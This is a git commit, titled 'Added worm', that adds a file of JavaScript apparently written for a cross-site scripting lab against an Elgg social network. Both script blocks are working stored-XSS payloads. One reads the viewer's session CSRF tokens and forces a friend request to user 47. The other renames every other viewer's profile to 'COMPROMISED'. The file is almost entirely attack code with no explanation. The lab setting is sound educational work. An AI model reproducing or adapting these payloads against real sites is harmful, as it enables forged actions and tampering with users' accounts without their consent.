1ab664e0d9c2799d1f8ac0a4b6c996fc6f61c88a
Kelvin Filyk <kelvinfilyk@Kelvins-MacBook-Pro-2.local>
2020-12-03 19:16:02 -0800

    Added worm

---
+++ xss_worm.js
@@ -0,0 +1,40 @@
+<script type="text/javascript">
+    window.onload= function() {
+        var Ajax = null;
+        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+        var token="&__elgg_token="+elgg.security.token.__elgg_token;
+        console.log(ts);
+        console.log(token);
+        var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token+ts+token;
+        Ajax = new XMLHttpRequest();
+        Ajax.open("GET", sendurl, true);
+        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send();
+}
+</script>
+
+<script type="text/javascript">
+    window.onload= function() {
+        var userName=elgg.session.user.name;
+        var guid="&guid="+elgg.session.user.guid;
+        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+        var token="&__elgg_token="+elgg.security.token.__elgg_token;
+        console.log(userName);
+        console.log(guid);
+        console.log(ts);
+        console.log(token);
+        var sendurl="http://www.xsslabelgg.com/action/profile/edit";
+        var samyGuid=47;
+        var content= "__elgg_token="+elgg.security.token.__elgg_token+ts+"&name=COMPROMISED&guid="+guid; // Renames a profile to COMPROMISED
+
+        if(elgg.session.user.guid!=samyGuid) {
+            var Ajax=null;
+            Ajax=new XMLHttpRequest();
+            Ajax.open("POST", sendurl, true);
+            Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            Ajax.send(content);
+        }
+    }
+</script>
